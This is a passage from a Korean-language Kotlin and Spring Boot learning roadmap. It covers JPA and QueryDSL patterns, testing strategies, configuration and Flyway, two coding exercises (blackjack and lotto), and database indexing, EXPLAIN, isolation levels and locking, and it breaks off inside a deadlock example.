    implementation("com.querydsl:querydsl-jpa:5.1.0:jakarta")
    kapt("com.querydsl:querydsl-apt:5.1.0:jakarta")
    kapt("jakarta.annotation:jakarta.annotation-api")
    kapt("jakarta.persistence:jakarta.persistence-api")
}

// Config
@Configuration
class QuerydslConfig(
    @PersistenceContext private val entityManager: EntityManager,
) {
    @Bean
    fun jpaQueryFactory(): JPAQueryFactory = JPAQueryFactory(entityManager)
}
```

**QuerydslRepositorySupporter (공통 베이스 클래스):**

```kotlin
open class QuerydslRepositorySupporter<T>(
    entityClass: Class<T>,
) : QuerydslRepositorySupport(entityClass) {

    override fun getQuerydsl(): Querydsl =
        checkNotNull(super.getQuerydsl()) { "Querydsl is null" }

    fun <R> getPage(query: JPQLQuery<R>, pageable: Pageable): Page<R> {
        val results = querydsl.applyPagination(pageable, query).fetch()
        val count = query.fetchCount()
        return PageImpl(results, pageable, count)
    }
}
```

**QueryDSL 실전 사용:**

```kotlin
@Repository
class ProductRepositoryImpl(
    private val queryFactory: JPAQueryFactory,
) : ProductRepositoryCustom {

    private val product = QProduct.product
    private val category = QCategory.category

    override fun findByCondition(condition: ProductSearchCondition, pageable: Pageable): Page<ProductDto> {
        val query = queryFactory
            .select(Projections.constructor(ProductDto::class.java,
                product.id,
                product.title,
                product.price,
                category.name,
            ))
            .from(product)
            .leftJoin(product.category, category)
            .where(
                titleContains(condition.title),
                categoryEq(condition.categoryId),
                priceBetween(condition.minPrice, condition.maxPrice),
                product.deletedAt.isNull,
            )
            .orderBy(toOrderSpecifier(pageable.sort))

        val content = querydsl.applyPagination(pageable, query).fetch()
        val count = queryFactory
            .select(product.count())
            .from(product)
            .where(/* same conditions */)
            .fetchOne() ?: 0L

        return PageImpl(content, pageable, count)
    }

    // null-safe 동적 조건 (null이면 조건 무시)
    private fun titleContains(title: String?): BooleanExpression? =
        title?.let { product.title.contains(it) }

    private fun categoryEq(categoryId: Long?): BooleanExpression? =
        categoryId?.let { product.category.id.eq(it) }

    private fun priceBetween(min: Int?, max: Int?): BooleanExpression? = when {
        min != null && max != null -> product.price.between(min, max)
        min != null -> product.price.goe(min)
        max != null -> product.price.loe(max)
        else -> null
    }
}
```

**N+1 해결 전략:**

```kotlin
// 문제: orders 100개 조회 시 user를 100번 추가 조회
@Entity
class Order(
    @ManyToOne(fetch = FetchType.LAZY)   // LAZY가 기본이자 권장
    val user: User,
    val amount: Int,
)

// 해결 1: Fetch Join (JPQL)
@Query("SELECT o FROM Order o JOIN FETCH o.user WHERE o.status = :status")
fun findWithUser(@Param("status") status: OrderStatus): List<Order>

// 해결 2: @EntityGraph
@EntityGraph(attributePaths = ["user", "items"])
@Query("SELECT o FROM Order o WHERE o.status = :status")
fun findWithUserAndItems(@Param("status") status: OrderStatus): List<Order>

// 해결 3: QueryDSL fetchJoin()
queryFactory.selectFrom(order)
    .join(order.user, user).fetchJoin()
    .where(order.status.eq(status))
    .fetch()

// 해결 4: Batch Size (N+1 → 1+1)
// application.yml
// spring.jpa.properties.hibernate.default_batch_fetch_size: 100
```

**Pagination 표준 패턴:**

```kotlin
// Controller
@GetMapping("/products")
fun getProducts(
    @RequestParam(defaultValue = "0") page: Int,
    @RequestParam(defaultValue = "20") size: Int,
    @RequestParam(defaultValue = "createdAt") sort: String,
    @RequestParam(defaultValue = "DESC") direction: Sort.Direction,
    condition: ProductSearchCondition,
): Page<ProductDto> {
    val pageable = PageRequest.of(page, size, Sort.by(direction, sort))
    return productService.findByCondition(condition, pageable)
}

// 응답: Page<T>가 자동으로 content, totalElements, totalPages 등 포함
{
    "content": [...],
    "totalElements": 100,
    "totalPages": 5,
    "number": 0,
    "size": 20,
    "first": true,
    "last": false
}
```

**Optimistic Locking (동시 수정 방지):**

```kotlin
@Entity
class Inventory(
    val productId: Long,
    var quantity: Int,

    @Version              // 수정 시마다 자동 증가, 충돌 시 OptimisticLockException
    val version: Long = 0,
)

// 재고 감소 — 동시에 두 사람이 시도하면 한 명은 실패
@Transactional
fun decreaseStock(productId: Long, amount: Int) {
    val inventory = inventoryRepository.findByProductId(productId)
    require(inventory.quantity >= amount) { "재고 부족" }
    inventory.quantity -= amount
    // version 불일치 시 OptimisticLockException → 재시도 처리
}
```

**Soft Delete (논리 삭제):**

```kotlin
@Entity
@SQLDelete(sql = "UPDATE products SET deleted_at = NOW() WHERE id = ?")
@Where(clause = "deleted_at IS NULL")   // 기본 조회에서 자동 제외
class Product(
    val title: String,
    val price: Int,
    var deletedAt: LocalDateTime? = null,
)

// deletedAt이 있는 것도 조회하려면
@Query("SELECT p FROM Product p WHERE p.id = :id")
fun findByIdIncludingDeleted(@Param("id") id: Long): Product?
```

**@Transactional 심화:**

```kotlin
@Service
@Transactional(readOnly = true)   // 클래스 기본값: 읽기 전용
class OrderService(
    private val orderRepository: OrderRepository,
    private val inventoryService: InventoryService,
) {
    // 읽기 — readOnly: 더티 체킹 비활성화, 성능 향상
    fun findOrder(id: Long): OrderDto = ...

    @Transactional                 // 메서드 오버라이드: 쓰기 가능
    fun placeOrder(request: OrderRequest): OrderDto {
        // 재고 감소 (별도 트랜잭션으로 분리 — 실패해도 주문은 유지)
        inventoryService.decreaseStock(request.productId, request.quantity)
        return orderRepository.save(request.toEntity()).toDto()
    }
}

// @Transactional 주의사항
class TransactionalPitfall {
    @Transactional
    fun outer() {
        inner()   // 같은 클래스 내 호출 — 트랜잭션 적용 안 됨! (Spring AOP 프록시 한계)
    }

    @Transactional(propagation = Propagation.REQUIRES_NEW)
    fun inner() { ... }

    // 해결: inner()를 별도 Service 빈으로 분리
}
```

---

### 4-H. Spring 테스트 전략

**테스트 피라미드:**

```
        /\
       /E2E\          ← 느림, 비용 큼, 소수만
      /──────\
     / 통합 테스트 \    ← TestContainers, @SpringBootTest
    /────────────\
   /   단위 테스트  \  ← 빠름, 많이, Mockito/Mockk
  /________________\
```

**테스트 슬라이스 — 목적에 맞는 컨텍스트만 로드:**

```kotlin
// @SpringBootTest: 전체 컨텍스트 로드 (느림, 통합 테스트용)
@SpringBootTest
@ActiveProfiles("test")
class OrderServiceIntegrationTest

// @WebMvcTest: Controller 레이어만 (Spring Security 포함)
@WebMvcTest(OrderController::class)
class OrderControllerTest {
    @Autowired lateinit var mockMvc: MockMvc
    @MockBean lateinit var orderService: OrderService   // Service는 Mock
}

// @DataJpaTest: JPA 레이어만 (in-memory DB 기본)
@DataJpaTest
class OrderRepositoryTest {
    @Autowired lateinit var orderRepository: OrderRepository
    @Autowired lateinit var entityManager: TestEntityManager
}
```

**TestContainers — 실제 DB로 통합 테스트 (실제 프로젝트 패턴):**

```kotlin
@SpringBootTest
@Testcontainers
@ActiveProfiles("test")
abstract class IntegrationTestBase {

    companion object {
        private val mariadb = MariaDBContainer("mariadb:10.11").apply {
            withDatabaseName("test_drive_portal")
            withUsername("test")
            withPassword("test")
            start()
        }

        @JvmStatic
        @DynamicPropertySource
        fun configureProperties(registry: DynamicPropertyRegistry) {
            registry.add("spring.datasource.url") { mariadb.jdbcUrl }
            registry.add("spring.datasource.username") { mariadb.username }
            registry.add("spring.datasource.password") { mariadb.password }
        }
    }

    @Autowired protected lateinit var objectMapper: ObjectMapper
    @Autowired protected lateinit var entityManager: EntityManager
    @Autowired protected lateinit var transactionManager: PlatformTransactionManager

    protected fun <T> transactional(block: () -> T): T =
        TransactionTemplate(transactionManager).execute { block() }!!
}

// 실제 사용
class ProductServiceIT : IntegrationTestBase() {

    @Autowired lateinit var productService: ProductService

    @Test
    fun `상품 생성 후 조회하면 저장된 정보가 반환된다`() {
        val request = ProductCreateRequest(title = "테스트 상품", price = 10_000)
        val created = transactional { productService.create(request) }

        val found = productService.findById(created.id)

        assertThat(found.title).isEqualTo("테스트 상품")
        assertThat(found.price).isEqualTo(10_000)
    }
}
```

**단위 테스트 (Mockito — 실제 프로젝트 패턴):**

```kotlin
@ExtendWith(MockitoExtension::class)
abstract class UnitTestBase

class OrderServiceTest : UnitTestBase() {

    @Mock private lateinit var orderRepository: OrderRepository
    @Mock private lateinit var inventoryService: InventoryService
    @InjectMocks private lateinit var sut: OrderService   // sut = System Under Test

    @Test
    fun `재고가 부족하면 INSUFFICIENT_STOCK 예외가 발생한다`() {
        whenever(inventoryService.getStock(1L)).thenReturn(0)

        assertThatThrownBy { sut.placeOrder(OrderRequest(productId = 1L, quantity = 1)) }
            .isInstanceOf(ApiException::class.java)
            .extracting("errorCode")
            .isEqualTo(ErrorCode.INSUFFICIENT_STOCK)
    }
}
```

**Mockk — Kotlin 친화적 Mock 라이브러리:**

```kotlin
// Mockito의 Kotlin 단점: final class mock 불가, every { } 대신 whenever(...) 불편
// Mockk: Kotlin용으로 설계

// build.gradle.kts
// testImplementation("io.mockk:mockk:1.13.12")

class OrderServiceMockkTest {

    private val orderRepository = mockk<OrderRepository>()
    private val inventoryService = mockk<InventoryService>()
    private val sut = OrderService(orderRepository, inventoryService)

    @Test
    fun `주문 생성 테스트`() {
        every { inventoryService.getStock(1L) } returns 10
        every { orderRepository.save(any()) } returnsArgument 0

        val result = sut.placeOrder(OrderRequest(productId = 1L, quantity = 2))

        assertThat(result.productId).isEqualTo(1L)
        verify { inventoryService.decreaseStock(1L, 2) }
    }
}
```

**MockMvc — Controller 계층 테스트:**

```kotlin
@WebMvcTest(OrderController::class)
@Import(SecurityConfig::class)
class OrderControllerTest {

    @Autowired lateinit var mockMvc: MockMvc
    @Autowired lateinit var objectMapper: ObjectMapper
    @MockBean lateinit var orderService: OrderService

    @Test
    @WithMockUser(roles = ["USER"])
    fun `주문 생성 요청 성공 시 201 반환`() {
        val request = OrderRequest(productId = 1L, quantity = 2)
        val response = OrderDto(id = 100L, productId = 1L, quantity = 2)

        given(orderService.placeOrder(any())).willReturn(response)

        mockMvc.post("/v1/orders") {
            contentType = MediaType.APPLICATION_JSON
            content = objectMapper.writeValueAsString(request)
        }.andExpect {
            status { isCreated() }
            jsonPath("$.id") { value(100L) }
            jsonPath("$.productId") { value(1L) }
        }
    }

    @Test
    @WithMockUser
    fun `@Valid 실패 시 400 반환`() {
        val invalidRequest = mapOf("productId" to -1, "quantity" to 0)

        mockMvc.post("/v1/orders") {
            contentType = MediaType.APPLICATION_JSON
            content = objectMapper.writeValueAsString(invalidRequest)
        }.andExpect {
            status { isBadRequest() }
        }
    }
}
```

**테스트 원칙:**
- Service 단위 테스트: Repository는 Mock — 비즈니스 로직만 검증
- Controller 테스트: Service는 Mock — 요청/응답 포맷, 상태 코드 검증
- Repository 통합 테스트: TestContainers 실제 DB — 쿼리 정확성 검증
- 서비스 통합 테스트: 전체 플로우, DB 포함 — 핵심 시나리오만

---

### 4-I. 설정 관리 & Flyway

**@ConfigurationProperties — 타입 안전한 설정:**

```kotlin
// build.gradle.kts
// kapt("org.springframework.boot:spring-boot-configuration-processor")

@ConfigurationProperties(prefix = "jwt")
data class JwtProperties(
    val secret: String,
    val accessExpiry: String = "3h",
    val refreshExpiry: String = "7d",
)

@ConfigurationProperties(prefix = "external.payment")
data class PaymentProperties(
    val baseUrl: String,
    val apiKey: String,
    val timeoutMs: Long = 5000,
)

// 활성화
@SpringBootApplication
@EnableConfigurationProperties(JwtProperties::class, PaymentProperties::class)
class Application
```

**application.yml 구조 — 실제 프로젝트 패턴:**

```yaml
server:
  port: 4000
  shutdown: graceful            # 진행 중인 요청 완료 후 종료
  servlet:
    context-path: /api

spring:
  application:
    name: test-drive-portal-api
  datasource:
    url: jdbc:mysql://${DB_HOST:localhost}:${DB_PORT:3306}/${DB_NAME:mydb}
    username: ${DB_USER:root}
    password: ${DB_PASSWORD:}
    hikari:
      maximum-pool-size: 10         # 최대 커넥션 수
      minimum-idle: 5               # 최소 유휴 커넥션
      connection-timeout: 30000     # 커넥션 획득 타임아웃 (ms)
      idle-timeout: 600000          # 유휴 커넥션 제거 시간 (ms)
      max-lifetime: 1800000         # 커넥션 최대 수명 (ms)
  jpa:
    hibernate:
      ddl-auto: validate            # prod: validate (스키마 자동 변경 금지)
    properties:
      hibernate:
        default_batch_fetch_size: 100   # N+1 방지 batch fetch
  flyway:
    enabled: true
    locations: classpath:db/migration
    baseline-on-migrate: false

jwt:
  secret: ${JWT_SECRET}
  access-expiry: ${JWT_ACCESS_EXPIRY:3h}
  refresh-expiry: ${JWT_REFRESH_EXPIRY:7d}
```

**Profile 분리:**

```yaml
# application-local.yml — 로컬 개발 (절대 커밋 금지, .gitignore 등록 필수)
spring:
  datasource:
    url: jdbc:mysql://localhost:3306/mydb_local
    username: root
    password: password
  jpa:
    show-sql: true
    hibernate:
      ddl-auto: update   # 로컬은 auto update 허용

# application-test.yml — 테스트 (TestContainers가 덮어씀)
spring:
  jpa:
    hibernate:
      ddl-auto: create-drop

# application-prod.yml
spring:
  datasource:
    hikari:
      maximum-pool-size: 50
  jpa:
    show-sql: false
```

```bash
# 실행 시 프로파일 지정
./gradlew bootRun --args='--spring.profiles.active=local'
java -jar app.jar --spring.profiles.active=prod
```

**HikariCP 커넥션 풀 튜닝 기준:**
- `maximum-pool-size`: CPU 코어 수 × 2 ~ 4 (I/O 집약적이면 더 크게)
- 너무 크면: DB 서버가 커넥션 관리 부담 증가
- 너무 작으면: 요청 대기(connection timeout) 발생
- 운영: Actuator metrics로 pool 사용률 모니터링

**Flyway 마이그레이션:**

```
src/main/resources/db/migration/
├── V1__init_schema.sql           ← 초기 스키마
├── V2__seed_data.sql             ← 시드 데이터
├── V3__add_user_email_index.sql  ← 인덱스 추가
├── V10__add_product_table.sql    ← 새 테이블
└── V11__rename_price_column.sql  ← 컬럼 이름 변경
```

**네이밍 규칙:** `V{버전}__{설명}.sql` (언더스코어 2개)

```sql
-- V10__add_product_table.sql
CREATE TABLE products (
    id         BIGINT       NOT NULL AUTO_INCREMENT,
    title      VARCHAR(200) NOT NULL,
    price      INT          NOT NULL,
    created_at DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
    deleted_at DATETIME     NULL,
    PRIMARY KEY (id)
);

CREATE INDEX idx_products_deleted_at ON products (deleted_at);
```

**Flyway 원칙:**
- 한 번 적용된 마이그레이션 파일은 **절대 수정 금지** (checksum 검증으로 감지됨)
- 실수 수정은 새 버전 파일로 (V11에서 V10 실수를 바로잡는 식)
- `ddl-auto: validate` → JPA 엔티티와 실제 스키마 불일치 시 구동 실패

**Spring Actuator (운영 모니터링):**

```kotlin
// build.gradle.kts
// implementation("org.springframework.boot:spring-boot-starter-actuator")

// application.yml
management:
  endpoints:
    web:
      exposure:
        include: health, info, metrics, prometheus
  endpoint:
    health:
      show-details: when-authorized
```

```
GET /actuator/health       → 서비스 상태 (DB 커넥션, 디스크 등 포함)
GET /actuator/metrics      → JVM 메모리, GC, HTTP 요청 통계
GET /actuator/prometheus   → Prometheus 스크래핑 포맷
```

---

## Phase 4 미션

### 미션 6: 블랙잭 (Step 2 → Step 3)

**카드 규칙:**
- 4문양 × 13종류 = 52장
- 숫자 카드: 액면가 / J/Q/K: 10 / A: 1 또는 11

**게임 상태 흐름:**
```
[카드 2장] → FirstTurn
                 │
         ┌───────┴───────┐
      합==21          합<21
         │               │
     Blackjack          Hit
                         │
              ┌──────────┼──────────┐
           합>21       합≤21    그만받기
              │           │           │
            Bust       다시Hit       Stay
```

**도메인 구조 (Step 2):**

```kotlin
enum class Suit { HEARTS, DIAMONDS, CLUBS, SPADES }
enum class Denomination(val score: Int) {
    ACE(1), TWO(2), THREE(3), FOUR(4), FIVE(5),
    SIX(6), SEVEN(7), EIGHT(8), NINE(9), TEN(10),
    JACK(10), QUEEN(10), KING(10)
}

data class PlayingCard(val suit: Suit, val denomination: Denomination)

class Hand(private val cards: List<PlayingCard> = emptyList()) {
    val size get() = cards.size
    val isBust get() = score() > 21
    val isBlackjack get() = size == 2 && score() == 21

    fun add(card: PlayingCard): Hand = Hand(cards + card)

    fun score(): Int {
        val base = cards.sumOf { it.denomination.score }
        val aceCount = cards.count { it.denomination == Denomination.ACE }
        return if (base + 10 <= 21 && aceCount > 0) base + 10 else base
    }
}

interface Participant {
    val hand: Hand
    fun addCard(card: PlayingCard): Participant
    fun firstCard(): PlayingCard
}

class Player(val name: String, override val hand: Hand = Hand()) : Participant {
    override fun addCard(card: PlayingCard) = Player(name, hand.add(card))
    override fun firstCard() = hand.cards.first()
}

class Dealer(override val hand: Hand = Hand()) : Participant {
    override fun addCard(card: PlayingCard) = Dealer(hand.add(card))
    override fun firstCard() = hand.cards.first()
    fun shouldHit() = hand.score() <= 16   // Step 3
}
```

**Step 3 추가 규칙:**
- 딜러: 16 이하면 히트 강제, 17 이상이면 스탠드
- 딜러 버스트 시 남은 플레이어 전원 자동 승리
- 게임 종료 후 각 플레이어 승/패 결과 출력

```kotlin
data class WinningResult(val wins: Int, val losses: Int) {
    companion object {
        fun calculate(player: Participant, dealer: Participant): WinningResult =
            when {
                player.hand.isBust -> WinningResult(0, 1)
                dealer.hand.isBust -> WinningResult(1, 0)
                player.hand.score() > dealer.hand.score() -> WinningResult(1, 0)
                player.hand.score() < dealer.hand.score() -> WinningResult(0, 1)
                else -> WinningResult(0, 0)   // 무승부
            }
    }
}
```

---

### 미션 7: 로또

**목표:** 컬렉션 연산 심화, 입출력 처리, 에러 핸들링

**기능 요구사항:**
- 구입 금액 입력 → 1,000원당 1장 발행
- 1~45 중 중복 없는 6개 숫자 랜덤 생성, 오름차순 출력
- 당첨 번호 6개 + 보너스 번호 1개 입력
- 등수 판별 및 수익률 계산 (소수점 둘째 자리 반올림)
- 잘못된 입력 시 `[ERROR]` 메시지 후 재입력

**등수 기준:**

| 등수 | 조건 | 상금 |
|---|---|---|
| 1등 | 6개 일치 | 2,000,000,000 |
| 2등 | 5개 + 보너스 | 30,000,000 |
| 3등 | 5개 | 1,500,000 |
| 4등 | 4개 | 50,000 |
| 5등 | 3개 | 5,000 |

**컬렉션 연산 핵심:**
```kotlin
data class Lotto(val numbers: List<Int>) {
    init {
        require(numbers.size == 6) { "로또 번호는 6개여야 합니다" }
        require(numbers.toSet().size == 6) { "중복 없어야 합니다" }
        require(numbers.all { it in 1..45 }) { "1~45 사이여야 합니다" }
    }

    companion object {
        fun generate(): Lotto = Lotto((1..45).shuffled().take(6).sorted())
    }

    fun countMatches(winning: List<Int>): Int = numbers.count { it in winning }
    fun hasBonus(bonus: Int): Boolean = bonus in numbers
}

fun calculateResults(
    lottos: List<Lotto>,
    winningNumbers: List<Int>,
    bonusNumber: Int
): Map<Rank, Int> = lottos
    .map { lotto ->
        val matches = lotto.countMatches(winningNumbers)
        val hasBonus = lotto.hasBonus(bonusNumber)
        Rank.of(matches, hasBonus)
    }
    .groupBy { it }
    .mapValues { (_, list) -> list.size }
```

---

## 전체 미션 로드맵

| Phase | 미션 | 핵심 개념 | JetBrains 슬라이드 |
|---|---|---|---|
| 1 | 숫자 야구 게임 | TDD, 메소드 분리, Kotest | Topic 1 (Introduction) |
| 1 | 자동차 경주 | data class, 불변성, DI | Topic 2 (OOP) |
| 1 | 좌표계산기 | abstract/sealed/interface | Topic 2 (OOP) |
| 3 | RSS리더 | HTTP, 병렬 fetch, 주기 실행 | Topic 6 (Parallel) |
| 3 | 코루틴 레이싱 | 코루틴, 취소, Channel | Topic 7 (Async) |
| 4 | 블랙잭 Step2+3 | FP, 컬렉션, 도메인 모델 | Topic 4+5 (Collections+FP) |
| 4 | 로또 | 컬렉션 심화, 입출력 | Topic 4 (Collections) |

**이후:** Spring Boot + JPA 심화 → `test-drive-portal-api` 직접 기여

---

## Phase 5: 데이터베이스 심화

> 애플리케이션 성능 문제의 80%는 DB에서 발생한다.  
> Index 설계, 쿼리 실행 계획, 트랜잭션 격리 수준을 이해하면 장애를 사전에 막을 수 있다.

### 5-A. Index 설계 전략

**왜 Index가 필요한가:**

```sql
-- Index 없음: Full Table Scan — 1,000만 행을 처음부터 끝까지 읽음
SELECT * FROM orders WHERE user_id = 123;

-- Index 있음: B-Tree 탐색 — O(log N) 로 원하는 행만 찾음
CREATE INDEX idx_orders_user_id ON orders (user_id);
```

**B-Tree Index 내부 구조:**
```
         [50]
        /    \
    [20,30]  [70,80]
   /   |  \   |    \
 [10] [25] [35] [60] [90]  ← 리프 노드: 실제 데이터 포인터(PK) 저장
```
- 항상 정렬된 상태 유지 → 범위 검색, ORDER BY 효율적
- INSERT/UPDATE/DELETE 시 재정렬 비용 발생 → 쓰기 성능 트레이드오프

**Index 종류:**

```sql
-- 단일 컬럼 Index
CREATE INDEX idx_users_email ON users (email);

-- 복합 Index (Composite) — 컬럼 순서가 핵심
CREATE INDEX idx_orders_user_status ON orders (user_id, status);

-- Unique Index
CREATE UNIQUE INDEX uq_users_email ON users (email);

-- Covering Index — SELECT 컬럼까지 포함시켜 테이블 접근 제거
CREATE INDEX idx_orders_covering ON orders (user_id, status, created_at, amount);
-- SELECT amount FROM orders WHERE user_id=1 AND status='PAID' → 테이블 안 봐도 됨
```

**복합 Index: 컬럼 순서 결정 원칙**

```sql
-- 쿼리: WHERE user_id = 1 AND status = 'PAID' AND created_at > '2024-01-01'

-- 좋은 순서: 등치(=) 조건 먼저, 범위(<,>) 조건 마지막
CREATE INDEX idx ON orders (user_id, status, created_at);
-- user_id로 좁히고 → status로 좁히고 → created_at 범위 적용

-- 나쁜 순서: 범위 조건이 중간에 있으면 그 이후 컬럼은 Index 미사용
CREATE INDEX idx ON orders (user_id, created_at, status);
-- user_id → created_at 범위 이후 status는 Index 못 탐
```

**Leftmost Prefix Rule (좌측 접두어 규칙):**
```sql
-- (user_id, status, created_at) 복합 Index 하나로
-- 아래 쿼리들을 모두 커버 가능:
WHERE user_id = 1                              -- ✅ user_id 사용
WHERE user_id = 1 AND status = 'PAID'          -- ✅ user_id, status 사용
WHERE user_id = 1 AND status = 'PAID' AND created_at > '2024-01-01'  -- ✅ 전체 사용

-- 하지만:
WHERE status = 'PAID'                          -- ❌ 첫 번째 컬럼 빠짐
WHERE user_id = 1 AND created_at > '2024-01-01'  -- ⚠️ user_id만 사용, status 건너뜀
```

**Index를 타지 않는 패턴 (주의!):**

```sql
-- 1. 컬럼에 함수 적용
WHERE YEAR(created_at) = 2024         -- ❌
WHERE created_at >= '2024-01-01'      -- ✅ 함수 없이 범위로

-- 2. 앞에 와일드카드
WHERE name LIKE '%홍길동'             -- ❌ Full Scan
WHERE name LIKE '홍길동%'             -- ✅ Index 사용 가능

-- 3. 컬럼 연산
WHERE price * 1.1 > 50000            -- ❌
WHERE price > 50000 / 1.1            -- ✅ 우변으로 이동

-- 4. 묵시적 형변환
WHERE user_id = '123'                 -- ❌ user_id가 INT인데 문자열 비교
WHERE user_id = 123                   -- ✅

-- 5. OR 조건 (인덱스 병합이 일어나지만 비효율적인 경우 많음)
WHERE status = 'PAID' OR status = 'REFUNDED'    -- UNION으로 분리 고려
```

**Cardinality (선택도):**
```sql
-- Cardinality: 해당 컬럼의 유니크한 값 수
-- 높을수록 Index 효과 큼

-- status: 'ACTIVE', 'INACTIVE' 2가지 → Cardinality 낮음 (Index 효과 미미)
-- email: 행마다 다름 → Cardinality 높음 (Index 매우 효과적)
-- user_id: 많은 주문이 같은 사용자 → 중간

-- 확인 방법
SHOW INDEX FROM orders;
-- Cardinality 컬럼 확인
```

**실무 Index 설계 체크리스트:**
- WHERE, JOIN ON, ORDER BY, GROUP BY에 쓰이는 컬럼을 파악
- 자주 쓰이는 쿼리 패턴 기준으로 복합 Index 설계
- Index가 너무 많으면 쓰기 성능 저하 — 꼭 필요한 것만
- 테이블 크기가 작으면(수천 건) Index 불필요, Full Scan이 더 빠름

---

### 5-B. EXPLAIN — 쿼리 실행 계획 분석

**기본 사용법:**

```sql
EXPLAIN SELECT o.id, o.amount, u.name
FROM orders o
JOIN users u ON o.user_id = u.id
WHERE o.status = 'PAID'
  AND o.created_at > '2024-01-01'
ORDER BY o.created_at DESC;
```

**EXPLAIN 결과 읽는 법:**

| 컬럼 | 의미 | 확인 포인트 |
|---|---|---|
| `type` | 접근 방식 | `ALL`이면 Full Scan → 개선 필요 |
| `key` | 사용된 Index | NULL이면 Index 미사용 |
| `rows` | 예상 스캔 행 수 | 클수록 느림 |
| `Extra` | 추가 정보 | `Using filesort`, `Using temporary` 주의 |

**type 값 (빠른 순 → 느린 순):**

```
const     → PK나 Unique Index로 단일 행 (가장 빠름)
eq_ref    → JOIN에서 Unique Index 사용
ref       → 일반 Index, 여러 행 가능
range     → Index 범위 스캔 (<, >, BETWEEN, IN)
index     → Index Full Scan (테이블 Full Scan보다는 낫지만 주의)
ALL       → Table Full Scan (가장 느림, 대용량에서 위험)
```

**Extra 주요 값:**

```sql
-- Using index: Covering Index 사용 → 테이블 접근 없음 (좋음)
-- Using where: Index 스캔 후 추가 필터링 (무조건 나쁜 건 아님)
-- Using filesort: ORDER BY를 Index로 처리 못함 → 별도 정렬 비용 발생
-- Using temporary: GROUP BY, DISTINCT에서 임시 테이블 생성 → 메모리/디스크 사용

-- filesort 제거: ORDER BY 컬럼을 Index에 포함
CREATE INDEX idx ON orders (status, created_at);
-- WHERE status = 'PAID' ORDER BY created_at → Using filesort 제거
```

**실전 EXPLAIN 분석 예시:**

```sql
-- 문제 쿼리: orders 1000만 건, 매일 슬로우 쿼리 발생
EXPLAIN
SELECT * FROM orders
WHERE user_id = 123
  AND status = 'PAID'
  AND created_at BETWEEN '2024-01-01' AND '2024-12-31';

-- 결과: type=ALL, rows=9,800,000, Extra=Using where
-- → Full Scan! Index가 없거나 타지 않는 중

-- 해결
CREATE INDEX idx_orders_user_status_date ON orders (user_id, status, created_at);

-- 재실행 결과: type=range, rows=127, key=idx_orders_user_status_date
-- → 9,800,000 → 127 스캔으로 개선
```

**EXPLAIN ANALYZE (MySQL 8.0+/MariaDB 10.8+):**
```sql
-- 실제 실행 후 실측값 포함
EXPLAIN ANALYZE
SELECT * FROM orders WHERE user_id = 123;
-- → actual time, actual rows 등 실제 측정값 포함
```

---

### 5-C. 트랜잭션 격리 수준

**트랜잭션 4대 특성 (ACID):**
- **A**tomicity: 전부 성공 or 전부 실패
- **C**onsistency: 트랜잭션 전후 데이터 정합성 유지
- **I**solation: 동시 실행 트랜잭션이 서로 간섭하지 않음
- **D**urability: 커밋된 데이터는 영구 보존

**격리 수준이 낮을수록 성능 높고, 이상 현상 발생 가능:**

```
격리 수준                  Dirty Read   Non-Repeatable Read   Phantom Read
READ UNCOMMITTED           발생          발생                  발생
READ COMMITTED             방지          발생                  발생
REPEATABLE READ (MySQL 기본) 방지        방지                  발생(InnoDB는 방지)
SERIALIZABLE               방지          방지                  방지
```

**이상 현상 실제 시나리오:**

```sql
-- Dirty Read: 커밋 안 된 데이터를 다른 트랜잭션이 읽음
-- TX A: UPDATE orders SET amount = 99999 WHERE id = 1 (커밋 안 함)
-- TX B: SELECT amount FROM orders WHERE id = 1 → 99999 읽음
-- TX A: ROLLBACK
-- TX B가 읽은 99999는 존재하지 않는 데이터

-- Non-Repeatable Read: 같은 쿼리를 두 번 실행했는데 결과가 다름
-- TX A: SELECT amount FROM orders WHERE id = 1 → 10,000
-- TX B: UPDATE orders SET amount = 20,000 WHERE id = 1; COMMIT
-- TX A: SELECT amount FROM orders WHERE id = 1 → 20,000 (다른 결과!)

-- Phantom Read: 같은 범위 쿼리인데 행이 추가/삭제됨
-- TX A: SELECT COUNT(*) FROM orders WHERE user_id = 1 → 5건
-- TX B: INSERT INTO orders (user_id, ...) VALUES (1, ...); COMMIT
-- TX A: SELECT COUNT(*) FROM orders WHERE user_id = 1 → 6건 (유령 행!)
```

**MySQL/MariaDB InnoDB의 기본값: REPEATABLE READ**

```sql
-- 현재 격리 수준 확인
SELECT @@transaction_isolation;   -- REPEATABLE-READ

-- InnoDB는 REPEATABLE READ에서도 Gap Lock으로 Phantom Read 방지
-- Gap Lock: 행과 행 사이의 "틈"에 락을 걸어 새 행 삽입 차단
```

**Spring에서 격리 수준 지정:**

```kotlin
// 기본값 사용 (DB 설정, 대부분 REPEATABLE READ)
@Transactional
fun processOrder(id: Long) { ... }

// 격리 수준 명시 — 재무 관련 로직
@Transactional(isolation = Isolation.SERIALIZABLE)
fun transferMoney(fromId: Long, toId: Long, amount: Int) { ... }

// READ COMMITTED — 긴 배치 작업에서 Phantom Read 허용하고 성능 우선
@Transactional(isolation = Isolation.READ_COMMITTED)
fun generateMonthlyReport(month: YearMonth): Report { ... }
```

**격리 수준 선택 기준:**

| 상황 | 권장 격리 수준 | 이유 |
|---|---|---|
| 일반 웹 API | `REPEATABLE READ` (기본값) | 적절한 균형 |
| 재고/잔액 감소 | `SERIALIZABLE` 또는 Optimistic Lock | 동시 수정 방지 |
| 통계/리포트 배치 | `READ COMMITTED` | 성능 우선, Phantom 허용 |
| 단순 조회 | `READ COMMITTED` | Non-Repeatable 허용해도 무방 |

---

### 5-D. Lock과 데드락

**InnoDB Lock 종류:**

```sql
-- 1. Shared Lock (S Lock): 읽기 락 — 여러 트랜잭션이 동시에 획득 가능
SELECT * FROM orders WHERE id = 1 LOCK IN SHARE MODE;

-- 2. Exclusive Lock (X Lock): 쓰기 락 — 단독으로만 획득 가능
SELECT * FROM orders WHERE id = 1 FOR UPDATE;
-- 또는 UPDATE/DELETE 시 자동 획득

-- 3. Gap Lock: 범위 사이 틈에 대한 락 (Phantom Read 방지)
-- 4. Next-Key Lock: 행 Lock + Gap Lock 조합 (InnoDB 기본)
```

**데드락 발생 조건:**

```sql
-- TX A                                    TX B
BEGIN;                                     BEGIN;
UPDATE orders SET status='DONE'            UPDATE orders SET status='DONE'
  WHERE id = 1;   ← id=1 X Lock 획득        WHERE id = 2;   ← id=2 X Lock 획득
UPDATE orders SET status='DONE'            UPDATE orders SET status='DONE'
  WHERE id = 2;   ← id=2 대기 (TX B 보유)    WHERE id = 1;   ← id=1 대기 (TX A 보유)
